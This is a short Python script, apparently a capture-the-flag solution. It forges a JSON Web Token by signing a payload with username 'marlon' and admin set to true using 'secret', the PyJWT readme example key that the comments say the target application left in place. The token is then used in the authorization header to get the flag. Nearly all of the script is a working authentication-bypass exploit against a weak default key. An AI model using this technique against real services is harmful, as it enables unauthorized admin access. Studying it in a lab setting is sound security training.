import jwt
#in the source code there is a comment left next to the secret key. It says PyJMT readme key
#change later. https://pypi.org/project/PyJWT/ So checked the read me and the key used
# is as secret so i used secret as my key when i encoded. The result of this script is then
# put into the token authorization to get the flag.
key = "secret"
encoded = jwt.encode({"username":"marlon","admin":'true'}, key, algorithm="HS256")

print(encoded)